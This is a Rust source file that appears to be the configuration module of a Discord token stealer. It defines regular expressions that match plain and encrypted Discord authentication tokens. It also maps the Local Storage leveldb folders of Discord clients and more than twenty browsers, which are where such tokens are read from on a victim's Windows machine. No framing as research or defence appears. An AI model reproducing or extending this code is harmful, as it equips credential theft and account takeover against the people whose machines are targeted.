use std::collections::HashMap;
use lazy_static::lazy_static;

use crate::global::utils::{ROAMING, APPDATA};

pub const ENCRYPTED_REGEX : &str = "dQw4w9WgXcQ:[^\"]*";
pub const REGEX : &str = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}";

lazy_static! {
    pub static ref PATHS: HashMap<&'static str, String> = {
        let map = HashMap::from([
            ("Discord", format!("{}\\discord\\Local Storage\\leveldb\\", ROAMING)),
            ("Discord Canary", format!("{}\\discordcanary\\Local Storage\\leveldb\\", ROAMING)),
            ("Lightcord", format!("{}\\Lightcord\\Local Storage\\leveldb\\", ROAMING)),
            ("Discord PTB", format!("{}\\discordptb\\Local Storage\\leveldb\\", ROAMING)),
            ("Opera", format!("{}\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\", ROAMING)),
            ("Opera GX", format!("{}\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\", ROAMING)),
            ("Amigo", format!("{}\\Amigo\\User Data\\Local Storage\\leveldb\\", APPDATA)),
            ("Torch", format!("{}\\Torch\\User Data\\Local Storage\\leveldb\\", APPDATA)),
            ("Kometa", format!("{}\\Kometa\\User Data\\Local Storage\\leveldb\\", APPDATA)),
            ("Orbitum", format!("{}\\Orbitum\\User Data\\Local Storage\\leveldb\\", APPDATA)),
            ("CentBrowser", format!("{}\\CentBrowser\\User Data\\Local Storage\\leveldb\\", APPDATA)),
            ("7Star", format!("{}\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\", APPDATA)),
            ("Sputnik", format!("{}\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\", APPDATA)),
            ("Vivaldi", format!("{}\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\", APPDATA)),
            ("Chrome SxS", format!("{}\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\", APPDATA)),
            ("Chrome", format!("{}\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\", APPDATA)),
            ("Chrome1", format!("{}\\Google\\Chrome\\User Data\\Profile 1\\Local Storage\\leveldb\\", APPDATA)),
            ("Chrome2", format!("{}\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb\\", APPDATA)),
            ("Chrome3", format!("{}\\Google\\Chrome\\User Data\\Profile 3\\Local Storage\\leveldb\\", APPDATA)),
            ("Chrome4", format!("{}\\Google\\Chrome\\User Data\\Profile 4\\Local Storage\\leveldb\\", APPDATA)),
            ("Chrome5", format!("{}\\Google\\Chrome\\User Data\\Profile 5\\Local Storage\\leveldb\\", APPDATA)),
            ("Epic Privacy Browser", format!("{}\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\", APPDATA)),
            ("Microsoft Edge", format!("{}\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb\\", APPDATA)),
            ("Uran", format!("{}\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\", APPDATA)),
            ("Yandex", format!("{}\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\", APPDATA)),
            ("Brave", format!("{}\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\", APPDATA)),
            ("Iridium", format!("{}\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\", APPDATA)),
        ]);
        map
    };
}
